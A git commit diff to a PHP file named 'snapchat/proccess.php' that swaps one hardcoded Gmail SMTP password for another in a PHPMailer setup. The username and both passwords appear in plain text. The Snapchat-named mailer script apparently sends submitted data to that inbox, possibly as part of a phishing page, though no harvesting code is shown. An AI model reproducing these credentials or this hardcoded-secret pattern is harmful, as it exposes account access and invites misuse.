2f721d061295460dea84fc5e4fb8ef6573ed6a76
nomiss7 <89870042+Decisionbot@users.noreply.github.com>
2022-11-02 14:42:05 +0300

    emailcorector

--- snapchat/proccess.php
+++ snapchat/proccess.php
@@ -20,7 +20,7 @@ try {
     $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
     $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
     $mail->Username   = 'mrsterixmr@gmail.com';                     //SMTP username
-    $mail->Password   = 'ppamjhevewmihvqz';                               //SMTP password
+    $mail->Password   = 'qofqwzqkitdfzutz';                               //SMTP password
     $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;            //Enable implicit TLS encryption
     $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
 
